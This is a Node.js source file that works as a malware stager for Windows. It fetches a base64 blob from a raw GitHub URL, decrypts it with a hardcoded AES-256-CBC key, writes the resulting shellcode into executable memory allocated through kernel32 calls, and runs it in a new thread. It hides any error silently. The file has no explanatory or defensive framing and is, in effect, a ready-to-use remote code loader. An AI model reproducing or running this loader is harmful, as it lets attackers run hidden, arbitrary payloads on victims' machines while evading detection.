const https = require('https');
const koffi = require('koffi');
const crypto = require('crypto');

const kernel32 = koffi.load('kernel32.dll');
const HEX_KEY = '55eacab21b72634fa939ede0defedff04d0ccb799fd468ace01de420e1103aa4';
const PAYLOAD_URL = 'https://raw.githubusercontent.com/fp228hash/12312s1/refs/heads/main/data.txt';

const VirtualAlloc = kernel32.func('void* VirtualAlloc(void*, size_t, uint32_t, uint32_t)');
const RtlMoveMemory = kernel32.func('void RtlMoveMemory(void*, const void*, size_t)');
const CreateThread = kernel32.func('void* CreateThread(void*, size_t, void*, void*, uint32_t, uint32_t*)');
const WaitForSingleObject = kernel32.func('uint32_t WaitForSingleObject(void*, uint32_t)');

const MEM_COMMIT_RESERVE = 0x3000;
const PAGE_EXECUTE_READWRITE = 0x40;

https.get(PAYLOAD_URL, (res) => {
    let rawData = '';
    res.on('data', chunk => rawData += chunk);
    res.on('end', () => {
        try {
            const full = Buffer.from(rawData.trim(), 'base64');
            const iv = full.subarray(0, 16);
            const encrypted = full.subarray(16);
            const key = Buffer.from(HEX_KEY, 'hex');
            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
            const shellcode = Buffer.concat([decipher.update(encrypted), decipher.final()]);

            const addr = VirtualAlloc(null, shellcode.length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
            RtlMoveMemory(addr, shellcode, shellcode.length);
            const thread = CreateThread(null, 0, addr, null, 0, null);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        } catch (e) {}
    });
});